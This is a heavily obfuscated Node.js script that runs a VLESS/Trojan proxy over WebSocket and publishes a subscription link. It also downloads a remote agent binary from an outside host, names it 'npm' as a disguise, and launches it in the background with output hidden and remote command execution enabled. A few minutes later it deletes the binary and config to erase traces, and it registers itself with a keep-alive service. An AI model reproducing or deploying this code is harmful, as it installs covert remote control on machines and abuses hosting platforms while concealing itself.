const _0x5aba51=_0x3b29;(function(_0x1c6309,_0x45ff7a){const _0x2cb4d2=_0x3b29,_0x589e0b=_0x1c6309();while(!![]){try{const _0x324b79=-parseInt(_0x2cb4d2(0x1e8))/0x1*(-parseInt(_0x2cb4d2(0x1f1))/0x2)+parseInt(_0x2cb4d2(0x243))/0x3+-parseInt(_0x2cb4d2(0x1e2))/0x4+parseInt(_0x2cb4d2(0x217))/0x5+parseInt(_0x2cb4d2(0x209))/0x6*(-parseInt(_0x2cb4d2(0x23c))/0x7)+parseInt(_0x2cb4d2(0x229))/0x8*(-parseInt(_0x2cb4d2(0x1ff))/0x9)+-parseInt(_0x2cb4d2(0x20c))/0xa*(-parseInt(_0x2cb4d2(0x226))/0xb);if(_0x324b79===_0x45ff7a)break;else _0x589e0b['push'](_0x589e0b['shift']());}catch(_0x220c42){_0x589e0b['push'](_0x589e0b['shift']());}}}(_0x4f7b,0x6b033));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5aba51(0x220)),net=require(_0x5aba51(0x1fb)),path=require(_0x5aba51(0x250)),crypto=require('crypto'),{Buffer}=require(_0x5aba51(0x1e3)),{exec,execSync}=require(_0x5aba51(0x232)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5aba51(0x200)]['UUID']||_0x5aba51(0x237),NEZHA_SERVER=process[_0x5aba51(0x200)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5aba51(0x200)][_0x5aba51(0x24e)]||'',NEZHA_KEY=process[_0x5aba51(0x200)]['NEZHA_KEY']||'',DOMAIN=process[_0x5aba51(0x200)][_0x5aba51(0x227)]||_0x5aba51(0x244),AUTO_ACCESS=process[_0x5aba51(0x200)][_0x5aba51(0x238)]||!![],WSPATH=process[_0x5aba51(0x200)][_0x5aba51(0x24f)]||UUID[_0x5aba51(0x252)](0x0,0x8),SUB_PATH=process[_0x5aba51(0x200)][_0x5aba51(0x22d)]||'sub',NAME=process[_0x5aba51(0x200)][_0x5aba51(0x1fd)]||'Hug',PORT=process[_0x5aba51(0x200)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4bb0dc=_0x5aba51;try{const _0x1cbe89=await axios[_0x4bb0dc(0x21d)]('https://speed.cloudflare.com/meta'),_0x3764ef=_0x1cbe89[_0x4bb0dc(0x211)];ISP=(_0x3764ef[_0x4bb0dc(0x240)]+'-'+_0x3764ef[_0x4bb0dc(0x1f2)])['replace'](/ /g,'_');}catch(_0x2941fc){ISP=_0x4bb0dc(0x1e9);}};GetISP();const httpServer=http['createServer']((_0x1e77c7,_0x4c6cb2)=>{const _0x5ee5f1=_0x5aba51;if(_0x1e77c7[_0x5ee5f1(0x208)]==='/'){const _0x44948b=path[_0x5ee5f1(0x1f5)](__dirname,'index.html');fs[_0x5ee5f1(0x1ef)](_0x44948b,'utf8',(_0x9e58c2,_0x56d589)=>{const _0x186ebb=_0x5ee5f1;if(_0x9e58c2){_0x4c6cb2[_0x186ebb(0x234)](0xc8,{'Content-Type':_0x186ebb(0x205)}),_0x4c6cb2[_0x186ebb(0x219)](_0x186ebb(0x236));return;}_0x4c6cb2[_0x186ebb(0x234)](0xc8,{'Content-Type':'text/html'}),_0x4c6cb2[_0x186ebb(0x219)](_0x56d589);});return;}else{if(_0x1e77c7[_0x5ee5f1(0x208)]==='/'+SUB_PATH){const _0x3b3244=_0x5ee5f1(0x203)+UUID+'@'+DOMAIN+_0x5ee5f1(0x230)+DOMAIN+_0x5ee5f1(0x1ea)+DOMAIN+_0x5ee5f1(0x1e1)+WSPATH+'#'+NAME+'-'+ISP,_0xea8210=_0x5ee5f1(0x213)+UUID+'@'+DOMAIN+_0x5ee5f1(0x249)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5ee5f1(0x1e1)+WSPATH+'#'+NAME+'-'+ISP,_0x42a277=_0x3b3244+'\x0a'+_0xea8210,_0x178ec6=Buffer[_0x5ee5f1(0x228)](_0x42a277)[_0x5ee5f1(0x21f)](_0x5ee5f1(0x246));_0x4c6cb2[_0x5ee5f1(0x234)](0xc8,{'Content-Type':_0x5ee5f1(0x22a)}),_0x4c6cb2[_0x5ee5f1(0x219)](_0x178ec6+'\x0a');}else _0x4c6cb2[_0x5ee5f1(0x234)](0x194,{'Content-Type':'text/plain'}),_0x4c6cb2[_0x5ee5f1(0x219)](_0x5ee5f1(0x239));}}),wss=new WebSocket[(_0x5aba51(0x233))]({'server':httpServer}),uuid=UUID[_0x5aba51(0x1df)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x5aba51(0x245)];function resolveHost(_0x4663b0){return new Promise((_0x5e65f2,_0x1e8622)=>{const _0x380239=_0x3b29;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x380239(0x231)](_0x4663b0)){_0x5e65f2(_0x4663b0);return;}let _0x316088=0x0;function _0x144f71(){const _0x20aa33=_0x380239;if(_0x316088>=DNS_SERVERS[_0x20aa33(0x20e)]){_0x1e8622(new Error(_0x20aa33(0x224)+_0x4663b0+_0x20aa33(0x23e)));return;}const _0x15b0ca=DNS_SERVERS[_0x316088];_0x316088++;const _0x65d262='https://dns.google/resolve?name='+encodeURIComponent(_0x4663b0)+_0x20aa33(0x253);axios[_0x20aa33(0x21d)](_0x65d262,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x20aa33(0x202)](_0x56184c=>{const _0x4e1044=_0x20aa33,_0x5c5ee8=_0x56184c[_0x4e1044(0x211)];if(_0x5c5ee8[_0x4e1044(0x1f8)]===0x0&&_0x5c5ee8[_0x4e1044(0x20b)]&&_0x5c5ee8[_0x4e1044(0x20b)][_0x4e1044(0x20e)]>0x0){const _0x19cb0f=_0x5c5ee8['Answer'][_0x4e1044(0x210)](_0x38031d=>_0x38031d[_0x4e1044(0x1ec)]===0x1);if(_0x19cb0f){_0x5e65f2(_0x19cb0f['data']);return;}}_0x144f71();})[_0x20aa33(0x223)](_0x397ea4=>{_0x144f71();});}_0x144f71();});}function handleVlessConnection(_0xb848a7,_0x454a97){const _0x3d2006=_0x5aba51,[_0x2fe0b3]=_0x454a97,_0x18f3b9=_0x454a97['slice'](0x1,0x11);if(!_0x18f3b9['every']((_0x5cc961,_0x4beab6)=>_0x5cc961==parseInt(uuid['substr'](_0x4beab6*0x2,0x2),0x10)))return![];let _0x2c1e04=_0x454a97[_0x3d2006(0x252)](0x11,0x12)[_0x3d2006(0x1e4)]()+0x13;const _0x158532=_0x454a97[_0x3d2006(0x252)](_0x2c1e04,_0x2c1e04+=0x2)[_0x3d2006(0x212)](0x0),_0x436fd4=_0x454a97[_0x3d2006(0x252)](_0x2c1e04,_0x2c1e04+=0x1)[_0x3d2006(0x1e4)](),_0x557dd9=_0x436fd4==0x1?_0x454a97[_0x3d2006(0x252)](_0x2c1e04,_0x2c1e04+=0x4)[_0x3d2006(0x1f5)]('.'):_0x436fd4==0x2?new TextDecoder()[_0x3d2006(0x242)](_0x454a97[_0x3d2006(0x252)](_0x2c1e04+0x1,_0x2c1e04+=0x1+_0x454a97['slice'](_0x2c1e04,_0x2c1e04+0x1)[_0x3d2006(0x1e4)]())):_0x436fd4==0x3?_0x454a97[_0x3d2006(0x252)](_0x2c1e04,_0x2c1e04+=0x10)['reduce']((_0x2e4448,_0x50c293,_0x21583f,_0xf28b88)=>_0x21583f%0x2?_0x2e4448[_0x3d2006(0x1fa)](_0xf28b88[_0x3d2006(0x252)](_0x21583f-0x1,_0x21583f+0x1)):_0x2e4448,[])['map'](_0x208af2=>_0x208af2[_0x3d2006(0x212)](0x0)[_0x3d2006(0x21f)](0x10))[_0x3d2006(0x1f5)](':'):'';_0xb848a7['send'](new Uint8Array([_0x2fe0b3,0x0]));const _0x1b130d=createWebSocketStream(_0xb848a7);return resolveHost(_0x557dd9)[_0x3d2006(0x202)](_0x512450=>{const _0x31024e=_0x3d2006;net[_0x31024e(0x241)]({'host':_0x512450,'port':_0x158532},function(){const _0x5b39a4=_0x31024e;this[_0x5b39a4(0x1e5)](_0x454a97['slice'](_0x2c1e04)),_0x1b130d['on'](_0x5b39a4(0x248),()=>{})[_0x5b39a4(0x22f)](this)['on']('error',()=>{})[_0x5b39a4(0x22f)](_0x1b130d);})['on']('error',()=>{});})['catch'](_0x50621f=>{const _0x55e5d6=_0x3d2006;net['connect']({'host':_0x557dd9,'port':_0x158532},function(){const _0x5f2814=_0x3b29;this[_0x5f2814(0x1e5)](_0x454a97['slice'](_0x2c1e04)),_0x1b130d['on'](_0x5f2814(0x248),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5f2814(0x22f)](_0x1b130d);})['on'](_0x55e5d6(0x248),()=>{});}),!![];}function handleTrojanConnection(_0x77e789,_0xa993a7){const _0x16b793=_0x5aba51;try{if(_0xa993a7['length']<0x3a)return![];const _0x69638a=_0xa993a7[_0x16b793(0x252)](0x0,0x38)[_0x16b793(0x21f)](),_0xc930e1=[UUID];let _0x443166=null;for(const _0x627ea1 of _0xc930e1){const _0x166a19=crypto[_0x16b793(0x22c)]('sha224')[_0x16b793(0x1e7)](_0x627ea1)[_0x16b793(0x1f7)]('hex');if(_0x166a19===_0x69638a){_0x443166=_0x627ea1;break;}}if(!_0x443166)return![];let _0x315e1c=0x38;_0xa993a7[_0x315e1c]===0xd&&_0xa993a7[_0x315e1c+0x1]===0xa&&(_0x315e1c+=0x2);const _0x52bcec=_0xa993a7[_0x315e1c];if(_0x52bcec!==0x1)return![];_0x315e1c+=0x1;const _0x3b97c4=_0xa993a7[_0x315e1c];_0x315e1c+=0x1;let _0x872507,_0x53ccb9;if(_0x3b97c4===0x1)_0x872507=_0xa993a7['slice'](_0x315e1c,_0x315e1c+0x4)[_0x16b793(0x1f5)]('.'),_0x315e1c+=0x4;else{if(_0x3b97c4===0x3){const _0x5cee1c=_0xa993a7[_0x315e1c];_0x315e1c+=0x1,_0x872507=_0xa993a7[_0x16b793(0x252)](_0x315e1c,_0x315e1c+_0x5cee1c)[_0x16b793(0x21f)](),_0x315e1c+=_0x5cee1c;}else{if(_0x3b97c4===0x4)_0x872507=_0xa993a7[_0x16b793(0x252)](_0x315e1c,_0x315e1c+0x10)[_0x16b793(0x207)]((_0x961199,_0x270c9f,_0x522bd5,_0x3eecff)=>_0x522bd5%0x2?_0x961199[_0x16b793(0x1fa)](_0x3eecff[_0x16b793(0x252)](_0x522bd5-0x1,_0x522bd5+0x1)):_0x961199,[])['map'](_0x22d6a5=>_0x22d6a5[_0x16b793(0x212)](0x0)[_0x16b793(0x21f)](0x10))[_0x16b793(0x1f5)](':'),_0x315e1c+=0x10;else return![];}}_0x53ccb9=_0xa993a7[_0x16b793(0x212)](_0x315e1c),_0x315e1c+=0x2;_0x315e1c<_0xa993a7[_0x16b793(0x20e)]&&_0xa993a7[_0x315e1c]===0xd&&_0xa993a7[_0x315e1c+0x1]===0xa&&(_0x315e1c+=0x2);const _0x3c0460=createWebSocketStream(_0x77e789);return resolveHost(_0x872507)[_0x16b793(0x202)](_0x1d45fc=>{const _0x43b615=_0x16b793;net[_0x43b615(0x241)]({'host':_0x1d45fc,'port':_0x53ccb9},function(){const _0x5f2ef6=_0x43b615;_0x315e1c<_0xa993a7[_0x5f2ef6(0x20e)]&&this['write'](_0xa993a7[_0x5f2ef6(0x252)](_0x315e1c)),_0x3c0460['on']('error',()=>{})[_0x5f2ef6(0x22f)](this)['on']('error',()=>{})[_0x5f2ef6(0x22f)](_0x3c0460);})['on'](_0x43b615(0x248),()=>{});})[_0x16b793(0x223)](_0xb59440=>{const _0x3dda67=_0x16b793;net['connect']({'host':_0x872507,'port':_0x53ccb9},function(){const _0x354d7a=_0x3b29;_0x315e1c<_0xa993a7[_0x354d7a(0x20e)]&&this[_0x354d7a(0x1e5)](_0xa993a7[_0x354d7a(0x252)](_0x315e1c)),_0x3c0460['on'](_0x354d7a(0x248),()=>{})[_0x354d7a(0x22f)](this)['on'](_0x354d7a(0x248),()=>{})[_0x354d7a(0x22f)](_0x3c0460);})['on'](_0x3dda67(0x248),()=>{});}),!![];}catch(_0x5f0639){return![];}}wss['on'](_0x5aba51(0x214),(_0x17726e,_0x22dc8c)=>{const _0xe96bc=_0x5aba51,_0x25d5ba=_0x22dc8c[_0xe96bc(0x208)]||'';_0x17726e[_0xe96bc(0x1f3)]('message',_0x57f3ad=>{const _0x579066=_0xe96bc;if(_0x57f3ad[_0x579066(0x20e)]>0x11&&_0x57f3ad[0x0]===0x0){const _0x381150=_0x57f3ad[_0x579066(0x252)](0x1,0x11),_0xf57915=_0x381150[_0x579066(0x21a)]((_0xb85c27,_0xb33412)=>_0xb85c27==parseInt(uuid[_0x579066(0x22e)](_0xb33412*0x2,0x2),0x10));if(_0xf57915){!handleVlessConnection(_0x17726e,_0x57f3ad)&&_0x17726e['close']();return;}}!handleTrojanConnection(_0x17726e,_0x57f3ad)&&_0x17726e['close']();})['on'](_0xe96bc(0x248),()=>{});});function _0x3b29(_0x230b0c,_0xa3cdb){const _0x4f7b90=_0x4f7b();return _0x3b29=function(_0x3b296b,_0x540606){_0x3b296b=_0x3b296b-0x1df;let _0x58bf26=_0x4f7b90[_0x3b296b];return _0x58bf26;},_0x3b29(_0x230b0c,_0xa3cdb);}const getDownloadUrl=()=>{const _0x2cd04d=_0x5aba51,_0x22d97b=os[_0x2cd04d(0x1eb)]();return _0x22d97b==='arm'||_0x22d97b===_0x2cd04d(0x23d)||_0x22d97b==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2cd04d(0x218):!NEZHA_PORT?_0x2cd04d(0x22b):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x35522d=_0x5aba51;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x11ec0b=getDownloadUrl(),_0x5d24c2=await axios({'method':_0x35522d(0x21d),'url':_0x11ec0b,'responseType':_0x35522d(0x1ed)}),_0x4f9468=fs[_0x35522d(0x1f4)](_0x35522d(0x23f));return _0x5d24c2[_0x35522d(0x211)][_0x35522d(0x22f)](_0x4f9468),new Promise((_0x41347c,_0x2ddfe6)=>{const _0x13677e=_0x35522d;_0x4f9468['on']('finish',()=>{const _0x271031=_0x3b29;console[_0x271031(0x225)]('npm\x20download\x20successfully'),exec(_0x271031(0x216),_0x577557=>{if(_0x577557)_0x2ddfe6(_0x577557);_0x41347c();});}),_0x4f9468['on'](_0x13677e(0x248),_0x2ddfe6);});}catch(_0x33005e){throw _0x33005e;}},runnz=async()=>{const _0x4d7c8e=_0x5aba51;try{const _0x4e2b26=execSync(_0x4d7c8e(0x21b),{'encoding':_0x4d7c8e(0x222)});if(_0x4e2b26[_0x4d7c8e(0x1ee)]()!==''){console[_0x4d7c8e(0x225)](_0x4d7c8e(0x1fc));return;}}catch(_0x3a6526){}await downloadFile();let _0x44fb9b='',_0x8e1aa7=[_0x4d7c8e(0x201),_0x4d7c8e(0x221),'2096',_0x4d7c8e(0x1e6),_0x4d7c8e(0x20f),_0x4d7c8e(0x215)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x562482=_0x8e1aa7[_0x4d7c8e(0x1f0)](NEZHA_PORT)?'--tls':'';_0x44fb9b='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d7c8e(0x20a)+NEZHA_KEY+'\x20'+_0x562482+_0x4d7c8e(0x23a);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x7d48b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4d7c8e(0x1e0)](':')[_0x4d7c8e(0x251)]():'',_0x5984d9=_0x8e1aa7['includes'](_0x7d48b)?'true':_0x4d7c8e(0x1f9),_0x289964='client_secret:\x20'+NEZHA_KEY+_0x4d7c8e(0x20d)+NEZHA_SERVER+_0x4d7c8e(0x204)+_0x5984d9+_0x4d7c8e(0x24a)+UUID;fs['writeFileSync']('config.yaml',_0x289964);}_0x44fb9b='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4d7c8e(0x225)](_0x4d7c8e(0x21c));return;}}try{exec(_0x44fb9b,{'shell':'/bin/bash'},_0x595fdd=>{const _0x47de02=_0x4d7c8e;if(_0x595fdd)console[_0x47de02(0x248)](_0x47de02(0x23b),_0x595fdd);else console['log']('npm\x20is\x20running');});}catch(_0x2a7d8c){console[_0x4d7c8e(0x248)](_0x4d7c8e(0x1fe)+_0x2a7d8c);}};async function addAccessTask(){const _0x46f7a8=_0x5aba51;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x52eb21=_0x46f7a8(0x24d)+DOMAIN+'/'+SUB_PATH;try{const _0x2bf6d1=await axios[_0x46f7a8(0x206)](_0x46f7a8(0x247),{'url':_0x52eb21},{'headers':{'Content-Type':'application/json'}});console[_0x46f7a8(0x225)](_0x46f7a8(0x1f6));}catch(_0x14449f){}}const delFiles=()=>{const _0x47b73c=_0x5aba51;fs[_0x47b73c(0x21e)](_0x47b73c(0x23f),()=>{}),fs['unlink'](_0x47b73c(0x24c),()=>{});};function _0x4f7b(){const _0x340985=['buffer','readUInt8','write','2087','update','1fdvnNC','Unknown','&fp=chrome&type=ws&host=','arch','type','stream','trim','readFile','includes','184940mYKPuV','asOrganization','once','createWriteStream','join','Automatic\x20Access\x20Task\x20added\x20successfully','digest','Status','false','concat','net','npm\x20is\x20already\x20running,\x20skip\x20running...','NAME','error:\x20','18FsyWDg','env','443','then','vless://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','text/html','post','reduce','url','882582Emwnam','\x20-p\x20','Answer','9470nZfKNh','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','2083','find','data','readUInt16BE','trojan://','connection','2053','chmod\x20+x\x20npm','43340HzXlqE','https://arm64.ssss.nyc.mn/agent','end','every','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','get','unlink','toString','axios','8443','utf-8','catch','Failed\x20to\x20resolve\x20','log','7315OGQWzh','DOMAIN','from','1442504CwmjLl','text/plain','https://amd64.ssss.nyc.mn/v1','createHash','SUB_PATH','substr','pipe',':443?encryption=none&security=tls&sni=','test','child_process','Server','writeHead','Server\x20is\x20running\x20on\x20port\x20','Hello\x20world!','f8d8b2f4-8b3a-4b8e-b2d1-1f6a9b3c5d7e','AUTO_ACCESS','Not\x20Found\x0a','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:','14dYWzrM','arm64','\x20with\x20all\x20DNS\x20servers','npm','country','connect','decode','1936101QCRYet','1234.abc.com','1.1.1.1','base64','https://oooo.serv00.net/add-url','error',':443?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','listen','config.yaml','https://','NEZHA_PORT','WSPATH','path','pop','slice','&type=A','replace','split','&path=%2F','1132468TgLtyJ'];_0x4f7b=function(){return _0x340985;};return _0x4f7b();}httpServer[_0x5aba51(0x24b)](PORT,()=>{const _0x2d3aef=_0x5aba51;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x2d3aef(0x235)+PORT);});
